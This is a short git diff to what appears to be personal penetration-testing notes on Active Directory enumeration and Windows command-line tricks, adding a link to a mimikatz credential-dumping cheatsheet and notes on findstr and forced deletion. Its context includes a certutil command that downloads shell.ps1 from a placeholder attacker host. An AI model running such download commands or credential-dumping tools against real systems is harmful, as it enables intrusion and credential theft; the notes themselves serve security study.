@@ -52,6 +52,9 @@ A good flag to use is `-Properties` with these, which takes a comma-separated li
 [Bloodhound](https://github.com/BloodHoundAD/BloodHound) with Sharphound can also be used for a graph overview of the domain.
 It has the drawback of being quite noisy though.
 
+## Post Exploit
+
+[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)
 
 
 ## CMD commands to remember
@@ -60,4 +63,8 @@ CMD equivalent of wget
 ```
 certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
 ```
+
+grep equivalent for cmd: `findstr`
+
+remove a file with force: `del /f`
 
